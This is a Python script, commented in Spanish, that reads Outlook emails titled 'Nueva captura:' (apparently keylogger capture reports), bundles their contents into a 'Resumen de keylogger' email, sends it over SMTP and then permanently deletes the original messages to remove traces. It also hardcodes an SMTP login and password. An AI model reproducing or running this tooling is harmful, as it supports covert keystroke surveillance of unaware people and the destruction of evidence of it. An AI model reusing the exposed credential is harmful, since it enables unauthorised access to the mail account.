
import win32com.client
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")


#or account in outlook.Folders:
  # print(account.Name)

#i_cuenta = outlook.Folders["gestion@arrosia.com"]  # Reemplaza con tu dirección de correo
#nbox = mi_cuenta.Folders["Bandeja de entrada"]  # o "Inbox" según idioma

# Función para obtener la bandeja de entrada


def get_inbox(account_name):
    # Busca la cuenta por nombre
    account = None
    for acc in outlook.Folders:
        if acc.Name == account_name:
            account = acc
            break
    if not account:
        print(f"No se encontró la cuenta: {account_name}")
        return

    # Accede a la bandeja de entrada de esa cuenta
    inbox = account.Folders["Bandeja de entrada"]  # o "Inbox" según idioma
    messages = inbox.Items

    nombre_correo = "Nueva captura: 2025-12-23 15:21:21"  # Reemplaza con el asunto que deseas buscar
    correos_dict = {}
    mensajes_a_borrar = []
    texto_avast = "Este correo electrónico ha sido analizado en busca de virus por el software antivirus de Avast."
    for message in messages:
        try:
            if "Nueva captura:" in message.Subject:
                fecha = str(message.ReceivedTime)
                body = message.Body
                if texto_avast in body:
                    body = body.split(texto_avast)[0].strip()
                body = "\n".join(line for line in body.splitlines() if line.strip() and not set(line.strip()) <= {"-"})
                correos_dict[fecha] = body
                mensajes_a_borrar.append(message)
               #message.Delete()  # Esto elimina el correo de Outlook
                print("Asunto:", message.Subject)
                print("De:", message.SenderName)
                print("Recibido el:", message.ReceivedTime)
                print("Cuerpo del mensaje:", message.Body)
                print("-" * 50)
                print("Mensaje encontrado y leído con éxito.")
        except Exception as e:
            print(f"Error al leer el correo: {e}")
    return correos_dict, mensajes_a_borrar






def enviar_resumen_keylogger(correos_dict):
    import datetime
    remitente = "gestion@arrosia.com"
    destinatario = "gestion@arrosia.com"
    dia_actual = datetime.datetime.now().strftime("%Y-%m-%d")

    # Ordenar las claves (fechas y horas)
    if not correos_dict:
        print("No hay correos para resumir.")
        return

    claves_ordenadas = sorted(correos_dict.keys())
    desde = claves_ordenadas[0]
    hasta = claves_ordenadas[-1]

    asunto = f"Resumen de keylogger {dia_actual} desde {desde} a {hasta}"

    # Construir el body con todos los valores del diccionario
    body = "\n\n".join(correos_dict.values())

    # Crear el mensaje MIME
    msg = MIMEMultipart()
    msg['From'] = remitente
    msg['To'] = destinatario
    msg['Subject'] = asunto
    msg.attach(MIMEText(body, 'plain'))

    # Configura aquí tu servidor SMTP y credenciales
    smtp_host = "smtp.arrosia.com"
    smtp_port = 587
    smtp_user = "gestion@arrosia.com"
    smtp_pass = "Ges2021tion"

    try:
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.starttls()
        server.login(smtp_user, smtp_pass)
        server.sendmail(remitente, destinatario, msg.as_string())
        server.quit()
        print("[+] Resumen enviado correctamente")
    except Exception as e:
        print("[-] Error al enviar el resumen:", str(e))

# Ejemplo de uso:
def borrar_mensajes(mensajes_a_borrar):
    for msg in mensajes_a_borrar:
        try:
            msg.Delete()  # Mueve el correo a "Elementos eliminados"
            print("Correo movido a la papelera.")
        except Exception as e:
            print(f"Error al borrar correo: {e}")
def borrar_definitivo_papelera(account_name, texto_asunto):
    account = None
    for acc in outlook.Folders:
        if acc.Name == account_name:
            account = acc
            break
    if not account:
        print(f"No se encontró la cuenta: {account_name}")
        return

    deleted_items = account.Folders["Elementos eliminados"]  # o "Deleted Items" según idioma
    items = list(deleted_items.Items)
    for item in items:
        try:
            if texto_asunto in item.Subject:
                item.Delete()
                print(f"Correo eliminado definitivamente: {item.Subject}")
        except Exception as e:
            print(f"Error al eliminar definitivamente: {e}")



correos_dict, mensajes_a_borrar = get_inbox("gestion@arrosia.com")
enviar_resumen_keylogger(correos_dict)
borrar_mensajes(mensajes_a_borrar)
borrar_definitivo_papelera("gestion@arrosia.com", "Nueva captura:")
